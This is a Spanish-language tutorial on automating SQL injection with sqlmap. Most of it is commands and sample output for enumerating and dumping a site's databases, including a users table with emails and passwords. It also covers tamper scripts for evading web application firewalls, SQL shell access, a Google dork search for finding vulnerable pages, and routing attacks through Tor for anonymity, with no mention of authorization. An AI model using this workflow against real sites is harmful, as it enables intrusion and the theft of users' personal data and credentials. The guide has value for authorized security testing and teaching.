# Inyecciónes sql automatizadas usando SQLMAP

## TEMAS 


* [Introducción](#Introducción)
* [¿Qué es sqlmap?](#¿Qué-es-sqlmap?)
* [Instalación de sqlmap](#Instalación-de-sqlmap)
* [Uso básico de sqlmap](#Uso-básico-de-sqlmap)
  * [Método GET](#Método-GET)
  * [Método POST](#Método-POST)
* [Inyección sql básica paso a paso](#Inyección-sql-básica-paso-a-paso)
* [Tampers](#Tampers)
  * [Qué es un Tamper](#Qué-es-un-Tamper)
  * [Funcion de un Tamper](#Funcion-de-un-Tamper)
  * [¿Cómo usar los tampers?](#¿Cómo-usar-los-tampers?) 
  * [Tampers mas usados](#Tampers-mas-usados)
    * [MySQL](#MySQL)
    * [MSSQL](#MSSQL)
    * [MSAccess](#MSAccess)
    * [PostgreSQL](#PostgreSQL)
    * [SQLite](#SQLite)
* [Techniques](#Techniques)
  * [Boolean-based blind](#Boolean-based-blind)
  * [Error-based](#Error-based)
  * [Union query-based](#Union-query-based)
  * [Stacked queries](#Stacked-queries)
  * [Time-based blind](#Time-based-blind)
  * [Inline queries](#Inline-queries)
* [Risk y Level](#Risk-y-Level)
* [SQL-SHELL](#SQL-SHELL)
* [SQL-SHELL](#SQL-SHELL)
* [Escaneos anonimos con Tor](#Escaneos-anonimos-con-Tor)


## ¿Qué es sqlmap?

SQLMap es una herramienta para explotar la vulnerabilidad de SQL injection. Esta herramienta automatiza el ataque para así explotar la página.


## Instalación de sqlmap

Para empezar me gustaría dejar la página oficial aquí: `http://sqlmap.org/`

Sqlmap es una herramienta que funciona en python en sus versiones: 2.6, 2.7 y 3.x en todas las plataformas, así que no hay problema para usarlo, personalmente lo he usado en windows, linux y en termux y en todas funciona exelente.

Lo primero que tenemos que hacer es tener instalado git para poder clonar su repositorio oficial a nuestro dispositivo, el sitio en git es el siguiente:

https://github.com/sqlmapproject/sqlmap.git

para clonarlo usamos lo siguiente:

git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

una vez que tengamos clonado el repositorio entramos a la carpeta `sqlmap-dev` y ejecutamos el archivo `sqlmap.py`:

`python sqlmap.py`


## Uso básico de sqlmap

Para ver las opciones de ayuda de esta herramienta basta con usar lo siguiente:

`sqlmap.py -h`

Lo que nos devolvera las opciones basicas para hacer un correcto uso de esta herramienta, algo que se tiene que entender bien es el correcto orden de ejecuion para agregar las opciones:

`sqlmap.py --opcion -u URL`

Algo que tenemos que tener en cuenta es que esta herramienta nos permite hacer escaneos desde el método GET y POST:

### Método GET

Sqlmap automaticamente usa el metodo GET para trabajar, la sintaxis nos queda de la siguiente manera:

`sqlmap.py -u "http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1"`

Algo muy importante a tener en cuenta es que sqlmap escanea la página parametro por paramerto, esto significa que si tenemos una página con mas de un parámetro tenemos que especificar el parámetro que queremos analizar o escanear todos uno a uno.


### Método POST

Para usar el método POST tenemos que decirle a la herramienta que utilizarémos este método, para eso usamos:

`--method POST`

Despues de declarar que usarémos el método post tenemos que declarar los parametros que vamos a analizar, para eso usamos:

`--data`

Ejemplo:

`sqlmap.py -u "http://www.paginaparaejemplo.com/algo.php" --method POST --data "id=1&id2=1&id3=1"`

Después de tener claro los métodos con los cuales podemos hacer el escaneo, tenemos que conocer las opciones basicas y generales para hacer un escaneo basico.

En las opciones podemos resaltar las mas generales e importantes, por ejemplo:

```
| -p parametro | Se utiliza para determinar el parametro que queremos analizar |

| --current-user | Nos extrar el nombre de usuario con el que interactuamos con la base de datos |

| --current-db | Nos extrae el nombre de la base de datos en la cual estamos |

| --dbs | Nos extrerá el numero de bases de datos y nos mostrará el nombre de cada una de ellas |

| -D nombre | Nos permite entrar en la base de datos seleccionada |

| --tables | Nos mostrará el numero de tablas dentro de una base de datos y los nombres de cada una de las tablas |

| -T nombre | Nos permite entrar en la tabla seleccionada | 

| --column | Nos extraerá el número de las columnas dentro de una tabla y nos mostrara el nombre de cada una de ellas |

| -C nombre | Nos permite seleccionar la columna |

| --dump | Nos permite extraer contenido de la base de datos |

| --dump-all | Nos extrae todo de la base de datos |


```

Una vez que ya conocemos las opciones basicas de la herramienta vamos a ver un ejemplo de como usarla:

## Inyección sql básica paso a paso

Para este ejemplo simularemos que tenemos una página vulnerable por el método GET, usarémos la siguiente url:

`sqlmap.py -u "http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1"`

Al empezar el escaneo, este de divide en partes:

Escaneará la coneccion con la página.
Escaneará la página en busca de algun WAF o IPS:

` [INFO] checking if the target is protected by some kind of WAF/IPS` 

Al terminar el escaneo, nos aparecera algo como esto:

```
[*] starting at 12:10:33

[12:10:33] [INFO] resuming back-end DBMS 'mysql' 
[12:10:34] [INFO] testing connection to the target url
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
---
Place: GET
Parameter: id
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
    Payload: id=3 AND (SELECT 1489 FROM(SELECT COUNT(*),CONCAT(0x3a73776c3a,(SELECT (CASE WHEN (1489=1489) THEN 1 ELSE 0 END)),0x3a7a76653a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
---
[12:10:37] [INFO] the back-end DBMS is MySQL
web server operating system: FreeBSD
web application technology: Apache 2.2.22
back-end DBMS: MySQL 5

```
Esto significa que ya ha terminado el escaneo, que la página es vulnerable y que conseguimos atacarla con exito. Lo siguiente es extraer el nombre de la base de datos, para extraer el nombre de las bases de datos vamos a usar la opcion `--dbs`:

`sqlmap.py -u "http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1" --dbs`

Al terminar vamos a tener los nombres de las bases de datos, algo como esto:

```
[*] starting at 12:12:56

[12:12:56] [INFO] resuming back-end DBMS 'mysql' 
[12:12:57] [INFO] testing connection to the target url
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
---
Place: GET
Parameter: id
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
    Payload: id3=1 AND (SELECT 1489 FROM(SELECT COUNT(*),CONCAT(0x3a73776c3a,(SELECT (CASE WHEN (1489=1489) THEN 1 ELSE 0 END)),0x3a7a76653a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
---
[12:13:00] [INFO] the back-end DBMS is MySQL
web server operating system: FreeBSD
web application technology: Apache 2.2.22
back-end DBMS: MySQL 5
[12:13:00] [INFO] fetching database names
[12:13:00] [INFO] the SQL query used returns 2 entries
[12:13:00] [INFO] resumed: information_schema
[12:13:00] [INFO] resumed: nombre_DB
available databases [2]:
[*] information_schema
[*] nombre_DB
```

Con esto tenemos las bases de datos, en este ejemplo tenemos `2`:

```
[*] information_schema
[*] nombre_DB
```

Ahora, vamos a entrar a la base de datos `nombre_DB` y estraerémos el nombre de las tablas:

`sqlmap.py -u "http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1" -D nombre_DB --tables`

Al terminar el escaneo tenemos algo como esto:

```
[11:55:18] [INFO] the back-end DBMS is MySQL
web server operating system: FreeBSD
web application technology: Apache 2.2.22
back-end DBMS: MySQL 5
[11:55:18] [INFO] fetching tables for database: 'nombre_DB'
[11:55:19] [INFO] heuristics detected web page charset 'ascii'
[11:55:19] [INFO] the SQL query used returns 3 entries
[11:55:20] [INFO] retrieved: usuarios
[11:55:21] [INFO] retrieved: otra_tabla
[11:55:21] [INFO] retrieved: hola_soy_otra_tabla
```

Al terminar tenemos las siguientes tablas:

`usuarios, otra_tabla, hola_soy_otra_tabla`

Lo siguiente es seleccionar una tabla y extraer las columnas dentro de ella:

`sqlmap.py -u "http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1" -D nombre_DB -T usuarios --columns`

Al terminar tenemos algo como esto:

```
[12:17:39] [INFO] the back-end DBMS is MySQL
web server operating system: FreeBSD
web application technology: Apache 2.2.22
back-end DBMS: MySQL 5
[12:17:39] [INFO] fetching columns for table 'users' in database 'safecosmetics'
[12:17:41] [INFO] heuristics detected web page charset 'ascii'
[12:17:41] [INFO] the SQL query used returns 4 entries
[12:17:42] [INFO] retrieved: id
[12:17:43] [INFO] retrieved: int(11)                                                                                         
[12:17:45] [INFO] retrieved: name                                                                                            
[12:17:46] [INFO] retrieved: text                                                                                            
[12:17:47] [INFO] retrieved: passwd                                                                                        
[12:17:48] [INFO] retrieved: text                                                                                            

.......

[12:17:59] [INFO] retrieved: hash
[12:18:01] [INFO] retrieved: varchar(128)
Database: nombre_DB
Table: users
[8 columns]
+-------------------+--------------+
| Column            | Type         |
+-------------------+--------------+
| email             | text         |
| id                | int(11)      |
| name              | text         |
| passwd            | text         |
+-------------------+--------------+
```

Tenemos las siguientes columnas:

`id, name, email, passwd`

Por último tenemos que extraer el contenido de esas columnas:

`sqlmap.py -u "http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1" -D nombre_DB -T usuarios -C id,name,email,passwd --dump `

Al terminar tenemos algo como esto:

```
+----+----------+---------------------+-------------------+
| id | name     | email               |      password     |
+----+----------+---------------------+-------------------+
| 0  | pepito   | pepito@correo.com   | contraseñasegura  |
+----+----------+---------------------+-------------------+

```

Con esto ya tenemos extraida la informacion que hay dentro de las columnas.


Una vez que hemos visto el uso básico para la utilización de esta herramienta vamos al siguiente paso, en el ejemplo anterior usamos como muestra una página inventada en donde todo funcionó desde la primera, pero siendo realistas no siempre pasa eso, siempre nos vamos a encontrar con sitios web mas "complicados" y es desde este punto en donde esto se hace mas interesante. vamos a ver el uso de TAMPERS

Otras opciones importantes que vamos a ver son:

```
| --random-agent | Lo cual nos permite "cambiar" el user agent con el cual se ejecutan las consultas |

| --proxy=proxy | Lo cual nos permite conectarnos a la página que queremos escanear por medio de un proxy |

| --level=1-5 | Este nos permite modificar el nivel de con el que queremos hacer el escaneo, por defecto esta en el en nivel 1 pero podemos cambiarlo hasta el 5 para hacer mas intrisivo el escaneo |

| --risk=1-3 | De igual manera que --level, risk nos permite cambiar el nivel con el que queremos hacer el escaneo agregando mas agresividad pero al mismo tiempo haciendo mas ruido, este se puede configurar desde el 1 al 3 vieniendo por defecto en el número 1 |

```

## TAMPERS

### Qué es un Tamper

Un tamper es un archivo en python que nos da la opcion de "camuflar" los payloads que usa la herramienta de sqlmap para asi poder "bypassear" algun WAF.

Sqlmap cuenta con una gran variedad de Tampers para ayudar a que la inyección sql se cumpla, cada Tamper tiene su funcion y su compativilidad, en algunos casos estos pueden mezclarse para un mejor resultado.

Podemos ver la lista completa de los tampers dentro de la repo de sqlmap

`https://github.com/sqlmapproject/sqlmap/tree/master/tamper`

### Funcion de un Tamper

Cada tamper tiene su propia funcionalidad, en este caso vamos a ver solo unos ejemplos para ver como estan diseñados los tampers y ver su funcionamiento.

como ejemplo vamos a analizar el tamper: randomcomments

`https://github.com/sqlmapproject/sqlmap/blob/master/tamper/randomcomments.py`

podemos ver su funcion en una parte de su codigo:

```
import re

from lib.core.common import randomRange
from lib.core.compat import xrange
from lib.core.data import kb
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def tamper(payload, **kwargs):
    """
    Add random inline comments inside SQL keywords (e.g. SELECT -> S/**/E/**/LECT)
    >>> import random
    >>> random.seed(0)
    >>> tamper('INSERT')
    'I/**/NS/**/ERT'
    """
```
Basicamente lo que hace es añadir comentarios en las palabras usadas en el payload, ejemplo:

```
SELECT -> S/**/E/**/LECT

UNION -> UN/**/I/**/ON
```

### ¿Cómo usar los tampers?

Para hacer uso de un tamper o varios tampers en el escaneo de un sitio web tenemos que especificarlo con la siguiente opcion:

`--tamper="nombredeltamper"`

si queremos usar mas de un tamper solo tenemos que usar una , para separarlos:

`--tamper="nombredeltamper1,nombredeltamper2,nombredeltamper3,etc"`

Entonces, tenemos la siguente linea con los tampers agregados:

`sqlmap.py -u "http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1" --tamper="nombredeltamper1,nombredeltamper2,nombredeltamper3,etc"`


### Tampers mas usados

Para poder clasificar los tampers mas usados primero debemos separar los tampers para organizarlos, como mencioné antes, cada tamper es diferente y cada uno se usa para cosas distintas, por eso vamos a separar los tampers por bases de datos en donde funcionan:

Tenemos lo siguiente:

#### MySQL

```
space2randomblank
unionalltounion
unmagicquotes
versionedkeywords
versionedmorekeywords
xforwardedforbetween
bluecoat
charencode
charunicodeencode
concat2concatws
equaltolike
greatest
halfversionedmorekeywords
ifnull2ifisnull
space2morehash
space2mysqldash
space2plus
modsecurityversioned
modsecurityzeroversioned
multiplespaces
securesphere
space2comment
space2hash
nonrecursivereplacement
percentage
randomcase

```

#### MSSQL

```
sp_password
space2comment
space2dash
space2mssqlblank
space2mysqldash
space2plus
space2randomblank
charencode
charunicodeencode
equaltolike
greatest
unionalltounion
unmagicquotes
multiplespaces
nonrecursivereplacement
percentage
randomcase
securesphere

```

#### MSAccess

```
modsecurityversioned
modsecurityzeroversioned
equaltolike
greatest
halfversionedmorekeywords
nonrecursivereplacement
percentage
randomcase
securesphere
between
bluecoat
charencode
charunicodeencode
concat2concatws
space2comment
space2hash
space2morehash
space2mysqldash
space2plus
space2randomblank
unionalltounion
unmagicquotes
versionedkeywords
versionedmorekeywords
ifnull2ifisnull
multiplespaces

```

#### PostgreSQL

```
xforwardedfor
space2comment
space2plus
space2randomblank
between
charencode
charunicodeencode
equaltolike
greatest
multiplespaces
nonrecursivereplacement
percentage
randomcase
securesphere
between

```

#### SQLite 

``` 
space2plus
unionalltounion
unmagicquotes
xforwardedfor
ifnull2ifisnull
randomcase
securesphere
space2comment
space2dashmmultiplespaces
nonrecursivereplacement

```
### Techniques 

Otro punto importante es conocer las tecnicas que utiliza esta herramienta.

Como sabemos, sqlmap utiliza muchos tipos de payloads los cuales se clasifican en 6 partes, los cuales son:

```
B: Boolean-based blind
E: Error-based
U: Union query-based
S: Stacked queries
T: Time-based blind
Q: Inline queries

```
#### Boolean-based blind

Boolean-based blind significa que la vulnerabilidad se basa en valores booleanos (true or false) y se dice que es ciega por que no muetra alguna señal de que hay un error en la página.

#### Error-based

Error-based significa que la inyeccion se basa en los mensajes de error que el servidor responde y asi conocer un poco mas sobre la estructura de la base de datos que se esta usando.

#### Union query-based

Union query-based significa que estamos aprovechando que el operador UNION de sql puede ser usado, gracias a esto podemos combinar declaraciones que serán visualizadas como parte de la respuesta del servidor.

#### Stacked queries

Stacked queries significa que la vulneravilidad se basa en añadir mas consultas sql en serie, de esta manera mandar una consulta normal y al mismo tiempo mandar la consulta del atacante, todo esto solo dividiendo las consultas con un ";".

#### Time-based blind

Time-based blind es cuando la vulnerabilidad se basa en el tiempo, lo que significa que un atacante enviará una consulta sql obligano a la base de datos a esperar una cierta cantidad de tiempo, si el tiempo de respuesta del servidor es el mismo tiempo que el atacante declaró en la sentencia, esto significa que es vulnerable.

#### Inline queries

Inline queries consiste en unir una query sql dentro de otra y asi sucesivamente para ver si la sentencia es ejecutada.

Ahora que ya sabemos cuales con las tecnicas y a que tipo de error de enfoca cada una, vamos a ver como utilizarlas.


Para utilizar alguna tecnica deltro del escaneo tenemos que declarar la siguente opcion:

`
--technique=TECH    SQL injection techniques to use (default "BEUSTQ")
`
Sqlmap por defecto utiliza todas las tecnicas al mismo tiempo lo que viene siendo igual que:

`
--technique=BEUSTQ
`

Esto es muy bueno, ya que la herramienta nos facilita mucho el trabajo pero al mismo tiempo esto hace que el escaneo tarde mas ya que escanea para todos los errores para detectarlo. Antes de hacer un escaneo tenemos que tratar de recolectar toda la informacion posible para que se nos haga mas sencillo el escaneo y ahorras mas tiempo, como por ejemplo detectar que error estamos viendo y asi declarar que tipo de error queremos explotar usando una tecnica para ese tipo de error en especifico, gracias a esto le decimos a la herramienta que se enfoque solamente en ese tipo de error y hacer mas rapido y directo el escaneo.

por ejemplo:

`sqlmap.py -u "http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1" --technique=B`


### Risk y Level

Otra cosa muy importante es conocer el "Risk" y Level":

Risk: riesgo de que se produzca un error. Los payloads que menos riesgo tienen son las de riesgo 1, y las que más las de riesgo 2.

Level: cantidad de peticiones por payload. El nivel 1 realiza pocas peticiones mientras que el nivel 5 realiza muchas.

### SQL-shell

la opción  `--sql-shell` nos carga una shell de SQL desde la cual podemos trabajar

Ejemplo:

`sqlmap.py -u "http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1" --sql-shell`

### SQL-query

la opción `--sql-query`

#### Sqlmap y dorks 

Sqlmap tambien nos permite hacer una busqueda por dorks de google para encontrar paginas vulnerables, esto se hace con la siguente secuencia:


`sqlmap.py -g DORK`

ejemplo:

`sqlmap.py -g "inurl:\".php?id=1\""`


### Escaneos anonimos con Tor

Una de las partes mas importantes al hacer un trabajo en el área de la seguridad informatica es saber cuidarse un poco, para es el anonimato es esencial, en este caso vamos a usar TOR para filtrar las peticiones.

`sqlmap.py --tor --tor-type=SOCKS5 --check-tor -u "http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1"`


Para terminar me gustaría agradecerte por dedicarle un poco de tu tiempo a este escrito, si te gusta puedes compartirlo.


